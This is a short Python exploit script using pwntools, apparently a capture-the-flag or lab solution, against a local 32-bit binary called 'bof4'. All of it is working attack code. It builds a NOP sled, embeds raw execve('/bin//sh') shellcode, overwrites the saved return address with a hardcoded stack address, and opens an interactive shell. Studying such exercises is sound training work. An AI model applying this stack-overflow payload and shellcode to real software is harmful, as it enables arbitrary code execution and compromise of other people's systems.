from pwn import *

elf = context.binary = ELF("./bof4")

SHELLCODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x08\x40\x40\x40\xcd\x80\x31\xc0\x40\xcd\x80"

PADDING = b"\x90" * (cyclic_find(0x63616172) - len(SHELLCODE) - 30) + SHELLCODE + b"A" * 30

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b *0x080484ab\ncontinue')

    return process(elf.path)

p = start()

p.sendline(PADDING + p32(0xffffd1c4))
p.interactive()
